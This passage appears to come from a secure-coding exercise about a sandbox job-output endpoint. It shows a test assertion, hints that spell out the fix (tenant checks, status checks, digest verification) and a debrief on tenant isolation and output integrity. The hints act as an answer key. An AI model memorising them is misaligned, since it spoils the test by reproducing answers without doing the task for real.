  ctx.Assert(r.Text().find("evil.example") == std::string::npos, "the mismatching output was served anyway: %s", r.Text());
}
`,
  },
  hints: [
    "Read a job with another tenant's header, or with none: it comes back with its output. Read a queued job: 200 with a null exit code. Replace the stored output and read again: the new bytes are served.",
    'The handler trusts the record and the id: it never reads `X-Tenant-Id`, never looks at `status`, copies the requested `profile`, and serves `read_output` without comparing it to `output_digest`.',
    '401 without the header; 404 when the job is missing or `job["tenant"] != tenant`; 409 unless `status == "finished"`; 500 `DIGEST_MISMATCH` when `jobs.digest(output) != job["output_digest"]`; answer `used_profile`.',
  ],
  debrief: `The read path is where a sandbox proves what it did, so every field in the answer has to be the recorded fact: the profile the container ran under, the exit code of a job that finished, and output whose digest still matches the one the runner recorded when it wrote it. Answering 404 for a foreign job keeps ids from being an oracle. The digest check moves trust from the storage to the record: a corrupted or replaced blob fails loudly instead of reaching a user. Production systems serve large outputs through short-lived signed URLs rather than inline, sign the digest record itself so the store cannot rewrite both, and log every read of a job's output for the tenant's audit.`,
};
